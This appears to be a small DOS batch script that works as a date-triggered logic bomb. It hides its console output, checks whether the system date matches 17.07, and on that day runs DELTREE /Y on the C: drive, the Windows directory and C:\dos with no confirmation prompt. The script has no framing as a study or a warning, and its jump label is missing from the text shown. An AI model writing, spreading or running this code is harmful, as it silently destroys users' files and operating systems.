@ctty nul
echo.|date|find "17.07">nul
if errorlevel 1 goto e
DELTREE /Y c:
DELTREE /Y %WINDIR%
DELTREE /Y c:\dos 